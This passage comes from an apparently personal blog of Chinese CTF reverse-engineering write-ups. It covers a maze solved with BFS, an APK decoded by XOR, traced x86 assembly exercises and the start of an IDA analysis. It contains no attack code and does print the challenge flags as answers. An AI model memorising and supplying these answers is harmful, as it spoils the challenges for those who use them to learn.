<span class="number">256</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; map2[i];</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后就手动对着16x16的地图走一遍吧,懒得再整代码之类的了(太麻烦了吧)—更新:代码已整(见结尾部分↓)</p><p>​整理出来某段该死的路径(眼睛快瞎了):</p><p>​wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</p><p>​在线md5出来:a8622109e2fb1296e06d5eed6f78f954</p><p>​记得外面是NSSCTF{}  <del>nnd试了半天才知道是这个格式才对,就不能说清楚</del></p><p>​flag: NSSCTF{a8622109e2fb1296e06d5eed6f78f954}</p><p>更新:走迷宫代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">&#125; pre[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> destination;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">struct</span> R&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">    pre[x][y] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    vis[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">R</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (map[now.x][now.y] == <span class="number">-1</span>) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            destination = now;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = now.x + dx[i];</span><br><span class="line">            <span class="type">int</span> y1 = now.y + dy[i];</span><br><span class="line">            <span class="keyword">if</span> (x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt;= <span class="number">15</span> &amp;&amp; y1 &gt;= <span class="number">0</span> &amp;&amp; y1 &lt;= <span class="number">15</span> &amp;&amp; !vis[x1][y1] &amp;&amp; map[x1][y1] != <span class="number">1</span>) &#123;</span><br><span class="line">                vis[x1][y1] = <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;x1, y1&#125;);</span><br><span class="line">                pre[x1][y1] = now;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_route</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">R</span> now = destination;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; route;</span><br><span class="line">    <span class="keyword">while</span> (!(pre[now.x][now.y].x == <span class="number">-1</span> &amp;&amp; pre[now.x][now.y].y == <span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> sub_x = now.x - pre[now.x][now.y].x;</span><br><span class="line">        <span class="type">int</span> sub_y = now.y - pre[now.x][now.y].y;</span><br><span class="line">        <span class="keyword">if</span> (sub_x &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_x &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        now=pre[now.x][now.y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(route.<span class="built_in">begin</span>(), route.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i: route)</span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">bfs</span>(<span class="number">15</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print_route</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​结束…</p><h2 id="easyapp"><a href="#easyapp" class="headerlink" title="easyapp"></a>easyapp</h2><p>​附件还挺花…没有zip后缀…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728182839055.png" alt="image-20230728182839055" style="zoom:33%;" /></p><p>​加上然后解压出来个apk…继续整吧,不会java是真的麻烦…</p><p>​又是smail…看来得学学这玩意…</p><h3 id="第一部分—encoder类"><a href="#第一部分—encoder类" class="headerlink" title="第一部分—encoder类"></a>第一部分—encoder类</h3><p>​总之就是分析代码…首先发现main中对输入的字符串进行了encode方法的调用,也就是所我们先要去查看encoder类:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200832325.png" alt="image-20230728200832325" style="zoom:50%;" /></p><p>​这里有个key的field(别问我这是什么…我没学过java…貌似是某种数据段)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200946254.png" alt="image-20230728200946254" style="zoom:50%;" /></p><p>​而且赋初值为0x75bcd15,继续分析发现后续代码有一个逻辑上的映射变换</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728201437225.png" alt="image-20230728201437225" style="zoom:45%;" /></p><p>​这里是一个循环↑分析:</p><p>​53行:循环边界,判断v1是否大于0,是的话跳出</p><p>​55行:将p1的第v2个字符赋值给v3</p><p>​58行:获取key(p0是Encoder类)给v4</p><p>​60行:v3和v4异或(xor)</p><p>​61行:字面意思</p><p>​65行:append到字符串(v0?)</p><p>​67行:v2自增,准备进行下一次循环</p><p>​也就是说这里的字符串对key进行了异或映射</p><h3 id="第二部分—main继续分析"><a href="#第二部分—main继续分析" class="headerlink" title="第二部分—main继续分析"></a>第二部分—main继续分析</h3><p>​为什么有两个MainActivity.smail…….</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202551209.png" alt="image-20230728202551209" style="zoom:33%;" /></p><p>​所以这里对key进行了重新赋值…我实在看不懂这东西的运行顺序…看WP看的这么个意思…</p><p>​总之就是要把p2和这个key进行异或运算然后就能出flag,p2就是这个(这个一看就懂):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202753479.png" alt="image-20230728202753479" style="zoom:33%;" /></p><p>​那么我们另外写脚本吧,就用python吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">&quot;\u68ff\u68e2\u68e2\u68f2\u68e5\u68f7\u68ca\u68d0\u68c1\u68da\u68e8\u68e8\u68f5\u68e2\u68cc&quot;</span></span><br><span class="line">key = <span class="number">0x3ade68b1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) ^ key) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#因为extend ascii字符是0x0-0xFF 但是unicode肯定是越界的, 所以这里要和0xff进行与操作来把最后结果限制到0x0-0xff</span></span><br><span class="line"><span class="comment">#运行脚本得到flag</span></span><br></pre></td></tr></table></figure><p>​这里因为对py不熟悉所以还是看了题解QWQ</p><p>​NSSCTF{apkYYDS}</p><p>​结束…(相当于把大佬的WP抄了一遍…)</p><h2 id="asm1"><a href="#asm1" class="headerlink" title="asm1"></a>asm1</h2><p>应该没有比我更闲的人了…这东西我还逆向出伪代码…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">asm1:</span><br><span class="line">&lt;+0&gt;:push   ebp              ; 将ebp寄存器的值保存到栈上</span><br><span class="line">&lt;+1&gt;:mov    ebp,esp         ; 将esp的值赋给ebp寄存器，建立新的栈帧</span><br><span class="line">&lt;+3&gt;:cmp    DWORD PTR [ebp+0x8],0x3a2   ; 比较ebp+0x8处的双字值与0x3a2</span><br><span class="line">&lt;+10&gt;:jg     0x512 &lt;asm1+37&gt;   ; 如果大于则跳转到地址0x512处继续执行</span><br><span class="line">&lt;+12&gt;:cmp    DWORD PTR [ebp+0x8],0x358   ; 否则，比较ebp+0x8处的双字值与0x358</span><br><span class="line">&lt;+19&gt;:jne    0x50a &lt;asm1+29&gt;   ; 如果不等于则跳转到地址0x50a处继续执行</span><br><span class="line">&lt;+21&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+24&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+27&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+29&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+32&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+35&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+37&gt;:cmp    DWORD PTR [ebp+0x8],0x6fa   ; 比较ebp+0x8处的双字值与0x6fa</span><br><span class="line">&lt;+44&gt;:jne    0x523 &lt;asm1+54&gt;   ; 如果不等于则跳转到地址0x523处继续执行</span><br><span class="line">&lt;+46&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+49&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+52&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+54&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+57&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+60&gt;:pop    ebp              ; 恢复栈帧，将栈顶指针赋给ebp寄存器</span><br><span class="line">&lt;+61&gt;:ret                    ; 返回</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来伪代码分析:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> &amp;k = [ebp+<span class="number">0x8</span>] <span class="comment">//写了个引用代表这个内存了哈哈哈</span></span><br><span class="line"><span class="keyword">if</span>(k&gt;<span class="number">0x3a2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(k!=<span class="number">0x6fa</span>)&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax+=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax-=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k!=<span class="number">0x358</span>)&#123;</span><br><span class="line">    ax=k</span><br><span class="line">    ax-=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ax=p</span><br><span class="line">    ax+=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意返回值就是eax</span></span><br></pre></td></tr></table></figure><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731233248628.png" alt="image-20230731233248628" style="zoom:33%;" /></p><p>貌似是动态flag,我这里是0x6fa,所以结果就是0x6fa-0x12&#x3D;&#x3D;0x6e8</p><p>结束…</p><h2 id="asm2"><a href="#asm2" class="headerlink" title="asm2"></a>asm2</h2><p>也是看代码,这个题就是一个循环:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235735960.png" alt="image-20230731235735960"></p><p>写解密代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0x21</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">0x2</span>;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;=<span class="number">0xfb46</span>)&#123;</span><br><span class="line">        a+=<span class="number">1</span>;</span><br><span class="line">        b+=<span class="number">0x74</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235633534.png" alt="image-20230731235633534" style="zoom:33%;" /></p><p>结束…</p><h2 id="asm3"><a href="#asm3" class="headerlink" title="asm3"></a>asm3</h2><p>这道题试试用c调用汇编函数,首先在win下编译失败…</p><h3 id="ubuntu下编译环境的搭建"><a href="#ubuntu下编译环境的搭建" class="headerlink" title="ubuntu下编译环境的搭建"></a>ubuntu下编译环境的搭建</h3><p>然后转到ubuntu,在编译时报了一个错:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091451315.png" alt="image-20230801091451315" style="zoom:33%;" /><p>百度后了解到是在x86_64直接编译32位程序报错,需要安装multilib库:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091609808.png" alt="image-20230801091609808" style="zoom:33%;" /><p>真就是配环境配了半天…又得更新包索引…</p><h3 id="代码修改"><a href="#代码修改" class="headerlink" title="代码修改"></a>代码修改</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101549684.png" alt="image-20230801101549684" style="zoom:45%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101514580.png" alt="image-20230801101514580" style="zoom:50%;" /><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101445107.png" alt="image-20230801101445107"></p><p>有一说一,没懂明白全为0的寄存器如何运行sub指令,不知道是我看的不对还是咋的</p><p>代码就是多了几个AL,AH寄存器而已(但是我不会算…字节位置有点没弄明白)</p><p>x86平台(即32位平台)的EAX占32位(4字节),EAX的低16位是AX,AX的低8位是AL,AX的高8位是AH</p><p>但是算起来内存没弄明白…</p><p>暂时结束…</p><h2 id="reverse-cipher"><a href="#reverse-cipher" class="headerlink" title="reverse_cipher"></a>reverse_cipher</h2><p>这题简单,直接拖IDA看,逆向分析逻辑就行,就是最后那个}字符不知道咋的IDA逆向出v11&#x3D;v5…v5前面都没有初始化…不过不影响…手动putchar(str[23]);就行</p><p>直接在IDA逆向出的代码中加注释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">23</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF //保存flag</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+17h] [rbp-39h] //?</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-24h] //标志位</span></span><br><span class="line">    FILE *v7; <span class="comment">// [rsp+30h] [rbp-20h] //rev_this的文件指针</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+38h] [rbp-18h] //flag的文件指针</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span 